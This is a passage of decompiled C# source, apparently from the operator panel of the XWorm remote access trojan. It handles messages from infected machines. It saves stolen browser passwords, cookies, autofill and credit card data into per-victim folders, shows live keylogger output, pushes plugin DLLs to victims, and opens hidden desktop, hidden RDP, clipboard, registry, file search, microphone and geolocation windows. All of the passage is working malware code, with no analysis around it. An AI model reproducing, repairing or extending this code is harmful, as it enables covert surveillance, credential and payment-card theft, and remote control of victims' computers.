							string text9 = array[2];
							if (text9.Length > 0)
							{
								Bitmap bitmap = (Bitmap)Image.FromStream(new MemoryStream(Module0.smethod_8(Convert.FromBase64String(text9))));
								hApps2.PictureBox1.Image = bitmap;
								hApps2.size_0 = bitmap.Size;
								hApps2.int_0++;
								if (hApps2.stopwatch_0.ElapsedMilliseconds >= 1000L)
								{
									hApps2.Text = "Hidden Apps : " + array[1] + "  FPS:" + hApps2.int_0 + "  Size:" + Module0.smethod_11(b.LongLength);
									hApps2.int_0 = 0;
									hApps2.stopwatch_0 = Stopwatch.StartNew();
								}
							}
							if (Operators.CompareString(hApps2.Guna2GradientButton1.Text, "Capturing...", TextCompare: false) == 0)
							{
								byte[] state = Module0.smethod_6("HApps+" + GClass19.string_0 + hApps2.Guna2ComboBox1.Text.Replace("%", "").ToString());
								_Closure_0024__R5_002D5 arg = default(_Closure_0024__R5_002D5);
								_Closure_0024__R5_002D5 CS_0024_003C_003E8__locals8 = new _Closure_0024__R5_002D5(arg);
								CS_0024_003C_003E8__locals8._0024VB_0024NonLocal_7 = C;
								ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
								{
									CS_0024_003C_003E8__locals8._0024VB_0024NonLocal_7.method_1((byte[])a0);
								}, state);
							}
							break;
						}
					case "RunRecovery":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							string text3 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1], "Recovery");
							string value = array[2];
							string text4 = text3 + "\\RecoveryData";
							if (!Directory.Exists(text4))
							{
								Directory.CreateDirectory(text4);
							}
							GClass11 gClass = JsonConvert.DeserializeObject<GClass11>(value);
							File.WriteAllText(text4 + "\\cookies.json", JsonConvert.SerializeObject(gClass.listcookie, Formatting.Indented));
							File.WriteAllText(text4 + "\\passwords.json", JsonConvert.SerializeObject(gClass.listps, Formatting.Indented));
							File.WriteAllText(text4 + "\\bookmark.json", JsonConvert.SerializeObject(gClass.listbmark, Formatting.Indented));
							File.WriteAllText(text4 + "\\history.json", JsonConvert.SerializeObject(gClass.listhist, Formatting.Indented));
							File.WriteAllText(text4 + "\\autofill.json", JsonConvert.SerializeObject(gClass.listautofill, Formatting.Indented));
							File.WriteAllText(text4 + "\\credit.json", JsonConvert.SerializeObject(gClass.listcredit, Formatting.Indented));
							string path = text4 + "\\cookies.txt";
							File.Delete(path);
							foreach (GClass15 item2 in gClass.listcookie)
							{
								File.AppendAllText(path, $"{item2.domain}\t{item2.hostOnly}\t{item2.path}\t{item2.httpOnly}\t{item2.expirationDate}\t{item2.name}\t{item2.value}\n".Replace("False", "FALSE").Replace("True", "TRUE"));
							}
							Module0.smethod_3(C.string_0.Split(':')[0] + " Passwords Was Saved @ ClientsFolder \\ " + array[1] + " \\ Recovery \\ RecoveryData", Color.Purple);
							break;
						}
					case "NgrokErr":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							ngrok ngrok4 = (ngrok)MyProject.Application.OpenForms["Ngrok Installer : " + array[1]];
							if (ngrok4 != null)
							{
								ngrok4.ToolStripStatusLabel1.ForeColor = Color.Red;
								ngrok4.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "GetClipboard":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Clipboard clipboard2 = (Clipboard)MyProject.Application.OpenForms["Clipboard : " + array[2]];
							if (clipboard2 != null)
							{
								clipboard2.RichTextBox1.Text = array[1];
							}
							break;
						}
					case "Clipboard":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Clipboard clipboard = (Clipboard)MyProject.Application.OpenForms["Clipboard : " + array[1]];
							if (clipboard != null)
							{
								C.method_3();
							}
							else if (clipboard == null)
							{
								clipboard = new Clipboard();
								clipboard.gclass5_0 = C;
								clipboard.Name = "Clipboard : " + array[1];
								clipboard.Text = "Clipboard : " + array[1];
								clipboard.Show();
							}
							break;
						}
					case "FilesSearcher":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							FilesSearcher filesSearcher3 = (FilesSearcher)MyProject.Application.OpenForms["Files Searcher : " + array[1]];
							if (filesSearcher3 != null)
							{
								C.method_3();
							}
							else if (filesSearcher3 == null)
							{
								filesSearcher3 = new FilesSearcher();
								filesSearcher3.gclass5_0 = C;
								filesSearcher3.Name = "Files Searcher : " + array[1];
								filesSearcher3.Text = "Files Searcher : " + array[1];
								filesSearcher3.Show();
							}
							break;
						}
					case "MBoxErr":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							MBox mBox2 = (MBox)MyProject.Application.OpenForms["MessageBox : " + array[1]];
							if (mBox2 != null)
							{
								mBox2.ToolStripStatusLabel1.ForeColor = Color.Red;
								mBox2.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "FilesSearcherErr":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							FilesSearcher filesSearcher2 = (FilesSearcher)MyProject.Application.OpenForms["Files Searcher : " + array[1]];
							if (filesSearcher2 != null)
							{
								filesSearcher2.Guna2GradientButton1.Enabled = true;
								filesSearcher2.ToolStripStatusLabel1.ForeColor = Color.Red;
								filesSearcher2.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "ppp":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							ProcessV processV = (ProcessV)MyProject.Application.OpenForms["Process Manager : " + array[1]];
							if (processV != null)
							{
								C.method_3();
							}
							else if (processV == null)
							{
								processV = new ProcessV();
								processV.gclass5_0 = C;
								processV.Name = "Process Manager : " + array[1];
								processV.Text = "Process Manager : " + array[1];
								processV.Show();
							}
							break;
						}
					case "WindowsList":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							HApps hApps = (HApps)MyProject.Application.OpenForms["Hidden Apps : " + array[1]];
							if (hApps == null)
							{
								break;
							}
							hApps.ListView1.Items.Clear();
							hApps.ImageList1.Images.Clear();
							string[] array3 = array[2].Split(new string[1] { "-==>" }, StringSplitOptions.None);
							int num2 = array3.Length - 1;
							int num3;
							for (num3 = 0; num3 <= num2; num3++)
							{
								if (array3[num3].Length > 0)
								{
									ListViewItem listViewItem2 = new ListViewItem();
									listViewItem2.Text = new FileInfo(array3[num3]).Name;
									listViewItem2.SubItems.Add(array3[num3 + 3]);
									Image image = Image.FromStream(new MemoryStream(Convert.FromBase64String(array3[num3 + 2])));
									hApps.ImageList1.Images.Add(array3[num3 + 1], image);
									listViewItem2.ImageKey = array3[num3 + 1];
									listViewItem2.ToolTipText = array3[num3];
									hApps.ListView1.Items.Add(listViewItem2);
								}
								num3 += 3;
							}
							hApps.ToolStripStatusLabel1.Text = "Apps [" + hApps.ListView1.Items.Count + "]";
							hApps.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							break;
						}
					case "FileManagerErr":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							FM fM = (FM)MyProject.Application.OpenForms["File Manager : " + array[1]];
							if (fM != null)
							{
								fM.ToolStripStatusLabel1.ForeColor = Color.Red;
								fM.ToolStripStatusLabel1.Visible = true;
								fM.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "GetWindows":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							ACT aCT2 = (ACT)MyProject.Application.OpenForms["ActiveWindows : " + array[1]];
							if (aCT2 == null)
							{
								break;
							}
							aCT2.ListView1.Items.Clear();
							string[] array12 = Strings.Split(array[2], "-=>");
							int num26 = array12.Length - 2;
							int num27;
							for (num27 = 0; num27 <= num26; num27++)
							{
								if (array12[num27].Length > 0)
								{
									ListViewItem listViewItem9 = new ListViewItem();
									listViewItem9.Text = array12[num27 + 1];
									listViewItem9.SubItems.Add(array12[num27]);
									listViewItem9.ImageIndex = 0;
									aCT2.ListView1.Items.Add(listViewItem9);
								}
								num27++;
							}
							aCT2.ToolStripStatusLabel2.Text = "Windows [" + Conversions.ToString(aCT2.ListView1.Items.Count) + "]";
							aCT2.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							break;
						}
					case "sendPlugin":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Module0.smethod_3("Sending the plugin to client " + C.string_0.Split(':')[0] + " for the first time please wait..", Color.RoyalBlue);
							string[] files = Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly);
							int num25 = 0;
							string text17;
							while (true)
							{
								if (num25 < files.Length)
								{
									text17 = files[num25];
									if (Operators.CompareString(array[1], Module0.smethod_10(text17), TextCompare: false) == 0)
									{
										break;
									}
									num25++;
									continue;
								}
								return;
							}
							byte[] state6 = Module0.smethod_6("savePlugin" + GClass19.string_0 + array[1] + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(File.ReadAllBytes(text17))));
							_Closure_0024__R5_002D8 arg6 = default(_Closure_0024__R5_002D8);
							_Closure_0024__R5_002D8 CS_0024_003C_003E8__locals0 = new _Closure_0024__R5_002D8(arg6);
							CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_10 = C;
							ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
							{
								CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_10.method_1((byte[])a0);
							}, state6);
							Module0.smethod_3("Plugin " + Path.GetFileName(text17) + " sent to " + C.string_0.Split(':')[0], Color.RoyalBlue);
							break;
						}
					case "Keylogger":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Keylogger keylogger = (Keylogger)MyProject.Application.OpenForms["Keylogger : " + array[1]];
							if (keylogger != null)
							{
								C.method_3();
							}
							else if (keylogger == null)
							{
								keylogger = new Keylogger();
								keylogger.gclass5_0 = C;
								keylogger.string_0 = array[1];
								keylogger.Name = "Keylogger : " + array[1];
								keylogger.Text = "Keylogger : " + array[1];
								keylogger.Show();
							}
							break;
						}
					case "pong":
						if (main_0.InvokeRequired)
						{
							main_0.Invoke(new _Read(smethod_0), C, b);
							break;
						}
						lock (GClass19.gclass5s_0)
						{
							try
							{
								if (C.listViewItem_0 != null)
								{
									int num18 = Conversions.ToInteger(array[1]);
									C.listViewItem_0.SubItems[main_0._Ping.Index].Text = Conversions.ToString(num18) + " MS";
									if (num18 > 400)
									{
										C.listViewItem_0.SubItems[main_0._Ping.Index].ForeColor = Color.Red;
									}
									else if (num18 > 200)
									{
										C.listViewItem_0.SubItems[main_0._Ping.Index].ForeColor = Color.Orange;
									}
									else
									{
										C.listViewItem_0.SubItems[main_0._Ping.Index].ForeColor = Color.Green;
									}
								}
								break;
							}
							catch (Exception ex11)
							{
								ProjectData.SetProjectError(ex11);
								Exception ex12 = ex11;
								Debug.WriteLine("pong: " + ex12.Message);
								ProjectData.ClearProjectError();
								break;
							}
						}
					case "RG":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Registry registry2 = (Registry)MyProject.Application.OpenForms["Registry Editor : " + array[1]];
							if (registry2 == null || Operators.CompareString(array[2], "~", TextCompare: false) != 0)
							{
								break;
							}
							registry2.RGk.Enabled = true;
							registry2.RGk.SelectedNode.Nodes.Clear();
							registry2.ListView1.Items.Clear();
							registry2.ToolStripProgressBar1.Value = 0;
							registry2.ToolStripProgressBar1.Maximum = array.Length - 3;
							int num15 = array.Length - 1;
							for (int l = 4; l <= num15; l++)
							{
								try
								{
									registry2.ToolStripProgressBar1 = registry2.ToolStripProgressBar1;
									registry2.ToolStripProgressBar1.Value++;
									if (array[l].Length <= 0)
									{
										continue;
									}
									if (array[l].Contains("/"))
									{
										string[] array8 = Strings.Split(array[l], "/");
										ListViewItem listViewItem7 = registry2.ListView1.Items.Add(array8[0]);
										listViewItem7.SubItems.Add(array8[1]);
										try
										{
											listViewItem7.SubItems.Add(array8[2]);
										}
										catch (Exception ex5)
										{
											ProjectData.SetProjectError(ex5);
											Debug.WriteLine(ex5.Message);
											ProjectData.ClearProjectError();
										}
										if (Operators.CompareString(array8[1], "String", TextCompare: false) == 0)
										{
											listViewItem7.ImageIndex = 1;
										}
										else
										{
											listViewItem7.ImageIndex = 2;
										}
									}
									else
									{
										registry2.RGk.SelectedNode.Nodes.Add(array[l]);
									}
								}
								catch (Exception ex6)
								{
									ProjectData.SetProjectError(ex6);
									Debug.WriteLine(ex6.Message);
									ProjectData.ClearProjectError();
								}
							}
							registry2.RGk.SelectedNode.Expand();
							registry2.RGk.Select();
							registry2.RGk.Focus();
							int num16 = registry2.ListView1.Columns.Count - 1;
							int num17 = 0;
							registry2.ToolStripStatusLabel1.ForeColor = Color.Black;
							while (num17 <= num16)
							{
								registry2.ListView1.Columns[num17].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
								num17++;
								registry2.ToolStripStatusLabel1.Text = "Keys [" + Conversions.ToString(registry2.ListView1.Items.Count) + "]";
							}
							registry2.ToolStripProgressBar1.Value = 0;
							break;
						}
					case "FileManager":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							FM fM4 = (FM)MyProject.Application.OpenForms["File Manager : " + array[1]];
							if (fM4 == null)
							{
								break;
							}
							if (Operators.CompareString(array[2], "Error", TextCompare: false) == 0)
							{
								fM4.Guna2GradientButton4.PerformClick();
								fM4.ToolStripStatusLabel1.ForeColor = Color.Red;
								fM4.ToolStripStatusLabel1.Visible = true;
								fM4.ToolStripStatusLabel1.Text = array[3];
								break;
							}
							fM4.ListView1.Items.Clear();
							fM4.ImageList1.Images.Clear();
							int num6 = 0;
							int num7 = 0;
							fM4.ImageList1.Images.Add(Conversions.ToString(0), XWorm_Resources.CD);
							fM4.ImageList1.Images.Add(Conversions.ToString(1), XWorm_Resources.HDD);
							fM4.ImageList1.Images.Add(Conversions.ToString(2), XWorm_Resources.Folder);
							fM4.ImageList1.Images.Add(Conversions.ToString(3), XWorm_Resources.Network);
							fM4.ImageList1.Images.Add(Conversions.ToString(4), XWorm_Resources.USB);
							string[] array5 = Strings.Split(array[2], "-=>");
							int num8 = array5.Length - 3;
							int num9;
							for (num9 = 0; num9 <= num8; num9++)
							{
								ListViewItem listViewItem4 = new ListViewItem();
								listViewItem4.Text = array5[num9];
								listViewItem4.SubItems.Add(array5[num9 + 2]);
								listViewItem4.SubItems.Add("");
								listViewItem4.SubItems.Add(array5[num9 + 1]);
								if (!listViewItem4.Text.StartsWith("[Drive]") & !listViewItem4.Text.StartsWith("[CD]") & !listViewItem4.Text.StartsWith("[Folder]") & !listViewItem4.Text.StartsWith("[USB]") & !listViewItem4.Text.StartsWith("[NET]"))
								{
									long byteCount = Convert.ToInt64(listViewItem4.SubItems[3].Text);
									listViewItem4.SubItems[3].Text = Module0.smethod_11(byteCount);
									listViewItem4.Tag = Convert.ToInt64(array5[num9 + 1]);
									string text8 = Path.GetExtension(listViewItem4.Text).ToLower();
									listViewItem4.SubItems[2].Text = Module0.smethod_2(listViewItem4.Text);
									if (text8.Length < 1)
									{
										if (!fM4.ImageList1.Images.ContainsKey("-=>"))
										{
											fM4.ImageList1.Images.Add("-=>", Module0.smethod_16(text8, Module0.IconSize.SHGFI_LARGEICON));
										}
										listViewItem4.ImageKey = "-=>";
									}
									else
									{
										if (!fM4.ImageList1.Images.ContainsKey(text8))
										{
											fM4.ImageList1.Images.Add(text8, Module0.smethod_16(text8, Module0.IconSize.SHGFI_LARGEICON));
										}
										listViewItem4.ImageKey = text8;
									}
									num7++;
								}
								if (listViewItem4.Text.StartsWith("[Drive]"))
								{
									listViewItem4.ImageIndex = 1;
									listViewItem4.Text = listViewItem4.Text.Substring(7);
								}
								else if (listViewItem4.Text.StartsWith("[CD]"))
								{
									listViewItem4.ImageIndex = 0;
									listViewItem4.Text = listViewItem4.Text.Substring(4);
								}
								else if (listViewItem4.Text.StartsWith("[USB]"))
								{
									listViewItem4.ImageIndex = 4;
									listViewItem4.Text = listViewItem4.Text.Substring(5);
								}
								else if (listViewItem4.Text.StartsWith("[Folder]"))
								{
									listViewItem4.ImageIndex = 2;
									listViewItem4.Text = listViewItem4.Text.Substring(8);
									listViewItem4.SubItems[2].Text = "File Folder";
									num6++;
								}
								else if (listViewItem4.Text.StartsWith("[NET]"))
								{
									listViewItem4.ImageIndex = 3;
									listViewItem4.Text = listViewItem4.Text.Substring(5);
								}
								fM4.ListView1.Items.Add(listViewItem4);
								num9 += 2;
							}
							fM4.ToolStripStatusLabel2.Text = "Folder[" + num6 + "]   Files[" + num7 + "]";
							try
							{
								if (array[3].ToString().Length > 3)
								{
									fM4.Guna2TextBox1.Text = array[3] + "\\";
								}
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
							fM4.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							break;
						}
					case "HostsMSG":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Hosts hosts = (Hosts)MyProject.Application.OpenForms["Edit Hosts : " + array[1]];
							if (hosts != null)
							{
								hosts.ToolStripStatusLabel1.ForeColor = Color.Green;
								hosts.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "CompilerMSG":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							VBCode vBCode2 = (VBCode)MyProject.Application.OpenForms["VB.Net Compiler : " + array[1]];
							if (vBCode2 != null)
							{
								vBCode2.ToolStripStatusLabel1.ForeColor = Color.Green;
								vBCode2.ToolStripStatusLabel1.Visible = true;
								vBCode2.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "Informations":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							INFO iNFO3 = (INFO)MyProject.Application.OpenForms["Information : " + array[1]];
							if (iNFO3 != null)
							{
								C.method_3();
							}
							else if (iNFO3 == null)
							{
								iNFO3 = new INFO();
								iNFO3.gclass5_0 = C;
								iNFO3.string_0 = array[1];
								iNFO3.Name = "Information : " + array[1];
								iNFO3.Text = "Information : " + array[1];
								iNFO3.Show();
							}
							break;
						}
					case "SysSound":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Sound sound2 = (Sound)MyProject.Application.OpenForms["System Sound : " + array[1]];
							if (sound2 != null)
							{
								C.method_3();
							}
							else if (sound2 == null)
							{
								sound2 = new Sound();
								sound2.gclass5_0 = C;
								sound2.Name = "System Sound : " + array[1];
								sound2.Text = "System Sound : " + array[1];
								try
								{
									sound2.wasapiOut_0.Init(sound2.bufferedWaveProvider_0);
									sound2.wasapiOut_0.Play();
								}
								catch (Exception projectError8)
								{
									ProjectData.SetProjectError(projectError8);
									ProjectData.ClearProjectError();
								}
								sound2.Show();
							}
							break;
						}
					case "hrdp":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							HRDP hRDP4 = (HRDP)MyProject.Application.OpenForms["Hidden RDP : " + array[1]];
							if (hRDP4 != null)
							{
								C.method_3();
							}
							else if (hRDP4 == null)
							{
								hRDP4 = new HRDP();
								hRDP4.gclass5_0 = C;
								hRDP4.Name = "Hidden RDP : " + array[1];
								hRDP4.Text = "Hidden RDP : " + array[1];
								hRDP4.Show();
							}
							break;
						}
					case "GetKeylogger":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Keylogger keylogger2 = (Keylogger)MyProject.Application.OpenForms["Keylogger : " + array[1]];
							if (keylogger2 != null)
							{
								keylogger2.stringBuilder_0.Append(array[2]);
								keylogger2.T1.Text = keylogger2.stringBuilder_0.ToString();
								keylogger2.T1.SelectionStart = keylogger2.T1.Text.Length;
								keylogger2.T1.ScrollToCaret();
								keylogger2.T1.Refresh();
							}
							break;
						}
					case "Performance":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Performance performance2 = (Performance)MyProject.Application.OpenForms["Performance : " + array[1]];
							if (performance2 != null)
							{
								C.method_3();
							}
							else if (performance2 == null)
							{
								performance2 = new Performance();
								performance2.gclass5_0 = C;
								performance2.Name = "Performance : " + array[1];
								performance2.Text = "Performance : " + array[1];
								performance2.Label3.Text = array[2];
								performance2.Label4.Text = array[3];
								performance2.Label6.Text = Conversions.ToString(Module0.smethod_14(Conversions.ToInteger(array[4])));
								performance2.Label9.Text = array[5];
								performance2.Label7.Text = array[6];
								performance2.Label12.Text = array[7] + " MHz";
								performance2.Show();
							}
							break;
						}
					case "GMapsapi":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Maps maps = (Maps)MyProject.Application.OpenForms["Location Manager : " + array[1]];
							if (maps == null)
							{
								break;
							}
							if (Operators.CompareString(array[2], null, TextCompare: false) == 0)
							{
								maps.ToolStripStatusLabel1.ForeColor = Color.Red;
								maps.ToolStripStatusLabel1.Text = "Error!";
								break;
							}
							maps.ToolStripStatusLabel1.ForeColor = Color.Green;
							maps.ToolStripStatusLabel1.Text = array[2];
							try
							{
								maps.GMapControl1.MapProvider = GMapProviders.GoogleMap;
								maps.GMapControl1.DragButton = MouseButtons.Left;
								maps.GMapControl1.Position = new PointLatLng(Conversions.ToDouble(array[2].Split(',')[0]), Conversions.ToDouble(array[2].Split(',')[1]));
								GMapOverlay gMapOverlay = new GMapOverlay();
								GMarkerGoogle gMarkerGoogle = new GMarkerGoogle(new PointLatLng(Conversions.ToDouble(array[2].Split(',')[0]), Conversions.ToDouble(array[2].Split(',')[1])), GMarkerGoogleType.blue);
								gMarkerGoogle.ToolTipText = string.Format("Location : " + DateTime.Now.ToLongTimeString());
								maps.GMapControl1.Overlays.Add(gMapOverlay);
								gMapOverlay.Markers.Add(gMarkerGoogle);
								gMarkerGoogle.ToolTipMode = MarkerTooltipMode.Always;
								break;
							}
							catch (Exception ex7)
							{
								ProjectData.SetProjectError(ex7);
								Exception ex8 = ex7;
								Debug.WriteLine("GMapsapi: " + ex8.Message);
								ProjectData.ClearProjectError();
								break;
							}
						}
					case "GetStartup":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							StartupManager startupManager = (StartupManager)MyProject.Application.OpenForms["Startup Manager : " + array[1]];
							if (startupManager == null)
							{
								break;
							}
							string[] array7 = Strings.Split(array[2], "-=>");
							int num13 = array7.Length - 1;
							int num14;
							for (num14 = 0; num14 <= num13; num14++)
							{
								if (array7[num14].Length > 0)
								{
									ListViewItem listViewItem6 = new ListViewItem();
									string text10 = array7[num14 + 1];
									listViewItem6.Text = array7[num14];
									if (Operators.CompareString(text10, "Task", TextCompare: false) == 0)
									{
										listViewItem6.ImageIndex = 0;
									}
									if (Operators.CompareString(text10, "File", TextCompare: false) == 0)
									{
										listViewItem6.ImageIndex = 1;
									}
									if (Operators.CompareString(text10, "Reg", TextCompare: false) == 0)
									{
										listViewItem6.ImageIndex = 2;
									}
									listViewItem6.SubItems.Add(text10);
									listViewItem6.SubItems.Add(array7[num14 + 2]);
									listViewItem6.ToolTipText = array7[num14 + 3];
									startupManager.ListView1.Items.Add(listViewItem6);
								}
								num14 += 3;
							}
							startupManager.ToolStripStatusLabel4.Text = "Startup [" + Conversions.ToString(startupManager.ListView1.Items.Count) + "]";
							startupManager.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							break;
						}
					case "ENCHAT":
						if (main_0.InvokeRequired)
						{
							main_0.Invoke(new _Read(smethod_0), C, b);
						}
						else
						{
							Chat chat3 = (Chat)MyProject.Application.OpenForms["Chat : " + array[1]];
							chat3.gclass5_0 = C;
							chat3.bool_0 = true;
							chat3.Timer1.Enabled = true;
						}
						break;
					case "HAppsMSG":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							HApps hApps3 = (HApps)MyProject.Application.OpenForms["Hidden Apps : " + array[1]];
							if (hApps3 != null)
							{
								hApps3.ToolStripStatusLabel2.Text = array[2];
							}
							break;
						}
					case "GetService":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							ServiceManager serviceManager = (ServiceManager)MyProject.Application.OpenForms["Service Manager : " + array[1]];
							if (serviceManager == null)
							{
								break;
							}
							serviceManager.ListView1.Items.Clear();
							string[] array4 = Strings.Split(array[2], "-=>");
							int num4 = array4.Length - 1;
							int num5;
							for (num5 = 0; num5 <= num4; num5++)
							{
								if (array4[num5].Length > 0)
								{
									ListViewItem listViewItem3 = new ListViewItem();
									listViewItem3.Text = array4[num5];
									listViewItem3.ImageIndex = 0;
									listViewItem3.SubItems.Add(array4[num5 + 1]);
									listViewItem3.SubItems.Add(array4[num5 + 2]);
									listViewItem3.SubItems.Add(array4[num5 + 3]);
									listViewItem3.SubItems.Add(array4[num5 + 4]);
									serviceManager.ListView1.Items.Add(listViewItem3);
								}
								num5 += 4;
							}
							serviceManager.ToolStripStatusLabel2.Text = "Service [" + Conversions.ToString(serviceManager.ListView1.Items.Count) + "]";
							serviceManager.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							break;
						}
					case "RGErr":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							Registry registry = (Registry)MyProject.Application.OpenForms["Registry Editor : " + array[1]];
							if (registry != null)
							{
								registry.RGk.Enabled = true;
								registry.ToolStripStatusLabel1.ForeColor = Color.Red;
								registry.ToolStripStatusLabel1.Text = array[2];
							}
							break;
						}
					case "GetInformations":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							INFO iNFO = (INFO)MyProject.Application.OpenForms["Information : " + array[1]];
							if (iNFO == null)
							{
								break;
							}
							iNFO.ListView1.Items.Clear();
							string[] array2 = Strings.Split(array[2], "-=>");
							foreach (string text in array2)
							{
								if (!text.Contains("Error!"))
								{
									ListViewItem listViewItem = new ListViewItem();
									listViewItem.Text = text;
									listViewItem.ImageKey = Strings.Split(text, " :")[0].ToLower() + ".png";
									iNFO.ListView1.Items.Add(listViewItem);
								}
							}
							iNFO.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							iNFO.ToolStripStatusLabel1.ForeColor = Color.Black;
							iNFO.ToolStripStatusLabel1.Text = "Informations [" + Conversions.ToString(iNFO.ListView1.Items.Count) + "]";
							break;
						}
					case "GetTCPConnection":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							TcpConnectionForm tcpConnectionForm2 = (TcpConnectionForm)MyProject.Application.OpenForms["TCP Connections : " + array[1]];
							if (tcpConnectionForm2 == null)
							{
								break;
							}
							tcpConnectionForm2.ListView1.Items.Clear();
							string[] array14 = array[3].Split(new string[1] { "-=>" }, StringSplitOptions.None);
							int num30 = array14.Length - 1;
							int num31;
							for (num31 = 0; num31 <= num30; num31++)
							{
								if (array14[num31].Length > 0)
								{
									ListViewItem listViewItem11 = new ListViewItem
									{
										Text = array14[num31]
									};
									if (Operators.CompareString(array14[num31], array[2], TextCompare: false) == 0)
									{
										listViewItem11.ForeColor = Color.Red;
									}
									listViewItem11.SubItems.Add(array14[num31 + 1]);
									listViewItem11.SubItems.Add(array14[num31 + 2]);
									listViewItem11.SubItems.Add(array14[num31 + 3]);
									listViewItem11.ToolTipText = array14[num31];
									listViewItem11.ImageIndex = 0;
									tcpConnectionForm2.ListView1.Items.Add(listViewItem11);
								}
								num31 += 3;
							}
							tcpConnectionForm2.ToolStripStatusLabel2.Text = "Connections [" + Conversions.ToString(tcpConnectionForm2.ListView1.Items.Count) + "]";
							tcpConnectionForm2.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							break;
						}
					case "ZipGet":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
							FilesSearcher filesSearcher4 = (FilesSearcher)MyProject.Application.OpenForms["Files Searcher : " + array[1]];
							if (filesSearcher4 == null)
							{
								break;
							}
							string text19 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1], "FilesSearcher");
							if (array[2].Contains("\\") | array[2].Contains("/") | array[1].Contains("\\") | array[1].Contains("/"))
							{
								filesSearcher4.ToolStripStatusLabel1.ForeColor = Color.Red;
								filesSearcher4.ToolStripStatusLabel1.Text = Path.GetFileName(array[2]) + " Download Blocked!";
								break;
							}
							filesSearcher4.Guna2GradientButton1.Enabled = true;
							if (!Directory.Exists(text19))
							{
								Directory.CreateDirectory(text19);
							}
							File.WriteAllBytes(text19 + "\\" + array[2], Module0.smethod_8(Convert.FromBase64String(array[3])));
							filesSearcher4.ToolStripStatusLabel1.ForeColor = Color.Green;
							filesSearcher4.ToolStripStatusLabel1.Text = "Successfully : " + array[2];
							break;
						}
					case "FormHVNC":
						{
							if (main_0.InvokeRequired)
							{
								main_0.Invoke(new _Read(smethod_0), C, b);
								break;
							}
